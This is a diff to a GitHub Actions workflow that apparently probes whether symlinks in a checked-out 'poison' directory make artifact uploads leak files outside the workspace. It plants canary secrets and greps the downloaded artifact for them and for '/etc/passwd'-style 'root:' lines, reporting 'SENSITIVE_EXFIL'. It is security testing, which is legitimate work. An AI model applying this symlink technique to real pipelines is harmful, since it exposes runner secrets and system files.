@@ -11,29 +11,27 @@ jobs:
         run: |
           set -euo pipefail
           echo "SECRET_TOKEN_$(openssl rand -hex 16)" > "$RUNNER_TEMP/ci-secret.txt"
-          echo "EVENT_PATH=$GITHUB_EVENT_PATH"
+          echo "WORK_SECRET_$(openssl rand -hex 8)" > "$GITHUB_WORKSPACE/../work-secret.txt"
+          echo "PLANTED_RUNNER_TEMP=$RUNNER_TEMP"
+          echo "PLANTED_WORKSPACE_PARENT=$(dirname "$GITHUB_WORKSPACE")"
           ls -la "$RUNNER_TEMP" | head
-          # also drop something under work root sibling
-          echo "WORK_SECRET_$(openssl rand -hex 8)" > "$GITHUB_WORKSPACE/../work-secret.txt" || true
-          ls -la "$GITHUB_WORKSPACE/.." | head
+          ls -la "$(dirname "$GITHUB_WORKSPACE")" | head
+          # Show event path for potential future symlink
+          echo "GITHUB_EVENT_PATH=$GITHUB_EVENT_PATH"
+          head -c 100 "$GITHUB_EVENT_PATH"; echo
 
       - uses: actions/checkout@v4
 
       - name: Show poison tree from checkout
         run: |
           set -euo pipefail
-          ls -la poison || { echo "no poison dir"; find . -maxdepth 3 -type l -ls; }
-          find poison -type l -exec ls -la {} \; 2>/dev/null || true
+          ls -la poison
+          find poison -exec ls -la {} \;
 
       - uses: actions/upload-artifact@v4
         with:
           name: symlink-escalate
           path: poison
-
-      - uses: actions/upload-artifact@v4
-        with:
-          name: symlink-escalate-workspace
-          path: .
 
   verify:
     needs: upload
@@ -43,14 +41,22 @@ jobs:
         with:
           name: symlink-escalate
           path: d1
-      - uses: actions/download-artifact@v4
-        with:
-          name: symlink-escalate-workspace
-          path: d2
-      - name: Inspect
+      - name: Inspect for sensitive exfil
         run: |
           set -euo pipefail
-          echo "=== d1 ==="; find d1 -print; find d1 -type f -exec sh -c echo; echo == $1 ==; file "$1"; head -c 200 "$1"; echo _ {} \;
-          echo "=== d2 interesting ==="; find d2 -type f | head -50
-          grep -R "SECRET_\|WORK_SECRET_\|root:\|CANARY" d1 d2 2>/dev/null && echo RESULT=SENSITIVE_EXFIL || echo RESULT=NO_SENSITIVE
-
+          echo "=== tree ==="
+          find d1 -print
+          echo "=== file types ==="
+          find d1 -exec ls -la {} \;
+          echo "=== contents (first 300B each) ==="
+          find d1 -type f -print0 | while IFS= read -r -d '' f; do
+            echo "== $f =="
+            file "$f" || true
+            head -c 300 "$f" || true
+            echo
+          done
+          if grep -R "SECRET_TOKEN_\|WORK_SECRET_\|root:" d1 2>/dev/null; then
+            echo "RESULT=SENSITIVE_EXFIL"
+          else
+            echo "RESULT=NO_SENSITIVE_OR_LINK_ONLY"
+          fi
